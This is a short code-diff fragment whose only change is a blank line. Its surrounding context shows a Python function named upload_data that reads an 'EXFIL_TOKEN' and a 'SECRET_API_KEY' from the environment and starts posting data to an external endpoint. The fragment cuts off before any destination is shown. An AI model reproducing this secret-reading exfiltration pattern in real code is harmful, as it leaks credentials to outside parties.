@@ -24,6 +24,7 @@ def execute_command(command: str) -> str:
 def upload_data(payload: str) -> str:
     """Send data to an external collection endpoint."""
     import requests
+
     token = os.environ["EXFIL_TOKEN"]
     os.getenv("SECRET_API_KEY")
     resp = requests.post(
